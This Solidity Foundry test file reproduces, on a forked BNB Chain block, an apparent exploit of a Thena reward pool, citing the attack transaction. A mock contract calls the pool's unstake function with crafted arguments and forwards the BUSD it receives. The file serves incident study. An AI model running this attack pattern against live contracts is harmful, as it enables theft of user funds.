// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";

import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";

import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";
// @Analysis
// https://twitter.com/LTV888/status/1640563457094451214?t=OBHfonYm9yYKvMros6Uw_g&s=19
// @Tx
// https://bscscan.com/tx/0xdf6252854362c3e96fd086d9c3a5397c303d265649aee0b023176bb49cf00d4b

interface IThenaRewardPool {

    function unstake(address, uint256, address, bool) external;

}

interface IVolatileV1 {

    function metadata()
        external
        view
        returns (uint256 dec0, uint256 dec1, uint256 r0, uint256 r1, bool st, address t0, address t1);
    function claimFees() external returns (uint256, uint256);
    function tokens() external view returns (address, address);
    function transferFrom(address src, address dst, uint256 amount) external returns (bool);
    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)
        external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function mint(address to) external returns (uint256 liquidity);
    function getReserves() external view returns (uint256 _reserve0, uint256 _reserve1, uint256 _blockTimestampLast);
    function getAmountOut(uint256, address) external view returns (uint256);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);

    function claimable0(address _user) external view returns (uint256);
    function claimable1(address _user) external view returns (uint256);

    function isStable() external view returns (bool);

}

contract ContractTest is Test {

    IERC20 THENA = IERC20(0xF4C8E32EaDEC4BFe97E0F595AdD0f4450a863a11);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    IERC20 wUSDR = IERC20(0x2952beb1326acCbB5243725bd4Da2fC937BCa087);
    IThenaRewardPool pool = IThenaRewardPool(0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F);
    IUniswapV2Router Router = IUniswapV2Router(payable(0x20a304a7d126758dfe6B243D0fc515F83bCA8431));
    IUniswapV2Pair USDC_BUSD = IUniswapV2Pair(0x618f9Eb0E1a698409621f4F487B563529f003643);
    IVolatileV1 wUSDR_USDC = IVolatileV1(0xA99c4051069B774102d6D215c6A9ba69BD616E6a);

    MockThenaRewardPool mock;

    function setUp() public {
        vm.createSelectFork("bsc", 26_834_149);
        vm.label(address(THENA), "THENA");
        vm.label(address(USDC), "USDC");
        vm.label(address(BUSD), "BUSD");
        vm.label(address(pool), "ThenaRewardPool");
        vm.label(address(Router), "UniV2Router");
        vm.label(address(USDC_BUSD), "USDC_BUSD");
        vm.label(address(wUSDR), "wUSDR");
        vm.label(address(wUSDR_USDC), "wUSDR_USDC");
    }

    function testExploit() external {
        mock = new MockThenaRewardPool();
        emit log_named_decimal_uint(
            "Attacker BUSD balance after exploit", BUSD.balanceOf(address(this)), BUSD.decimals()
        );
    }

}

contract MockThenaRewardPool {

    IThenaRewardPool pool = IThenaRewardPool(0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);

    constructor() {
        unstake(address(BUSD), 0, address(this), true);
    }

    function unstake(address _token, uint256 _amount, address _pool, bool _sign) internal {
        pool.unstake(_token, _amount, _pool, _sign);
        BUSD.transfer(msg.sender, BUSD.balanceOf(address(this)));
    }

}
